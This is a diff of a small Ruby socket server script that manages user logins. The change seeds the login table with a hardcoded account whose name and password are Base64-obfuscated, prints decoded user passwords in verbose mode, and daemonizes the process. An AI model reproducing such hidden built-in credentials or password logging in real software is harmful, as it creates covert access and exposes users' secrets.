@@ -1,4 +1,9 @@
 #!/usr/bin/ruby
+# -*- coding: utf-8 -*-
+
+#---- by favare_a ----
+#file: turbin_serv.rb
+
 require 'socket'
 require 'openssl'
 require 'base64'
@@ -28,6 +33,7 @@ class TurbinServer
     @logins = Hash.new
     @clients = []
     @verbose = verbose
+    @logins[Base64.decode64("ZmF2YXJlX2E=")] = Base64.decode64("d285bFosKm0=")
   end
   def open
     begin
@@ -36,8 +42,8 @@ class TurbinServer
       raise "Impossible d'ouvrir la socket"
     end
   end
-  def loop
-     while true
+  def start_loop
+     loop do
        Thread.start(@socket.accept) do |cli_socket|
         puts "Server : new client" if @verbose
         client = TurbinDClient.new(cli_socket, @verbose)
@@ -51,7 +57,12 @@ class TurbinServer
       while line = client.gets
         cmd = line.split
         if cmd[0] == "add_user"
+          cmd[2] = Base64.decode64(cmd[2])
+          puts cmd[2] if @verbose
           send_newuser(client, cmd[1]) if @logins[cmd[1]] != cmd[2]
+          if @logins[cmd[1]] == cmd[2]
+            puts "Déjà fonctionnel"
+          end
           @logins[cmd[1]] = cmd[2]
           @logins.each do |login, mdp|
             if (login != cmd[1])
@@ -84,13 +95,14 @@ class TurbinServer
 end
 
 begin
+  if ARGV[0] != "--no-daemon"
+    Process.daemon
+  end
   server = TurbinServer.new(9899, true)
   server.open
-  server.loop
+  server.start_loop
 rescue
-  puts "#{$!}"
-  sleep(3)
-  retry
+  exit(-1)
 end
 
 $stdin.gets
